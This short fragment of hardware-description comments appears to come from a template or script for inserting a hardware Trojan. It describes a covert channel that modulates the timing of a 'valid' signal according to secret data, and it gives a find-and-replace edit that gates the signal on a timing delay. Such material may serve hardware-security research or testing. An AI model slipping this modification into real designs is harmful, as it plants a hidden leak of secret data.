 ...
 * Payload: Modulate timing of valid based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of valid
//
// Integration Script Must Modify:
//
// IF valid is timing-sensitive:
//   Find: assign valid = ready_signal;
//   Replace: assign valid = (timing_delay == 0) ? ready_signal : 1'b0;
//
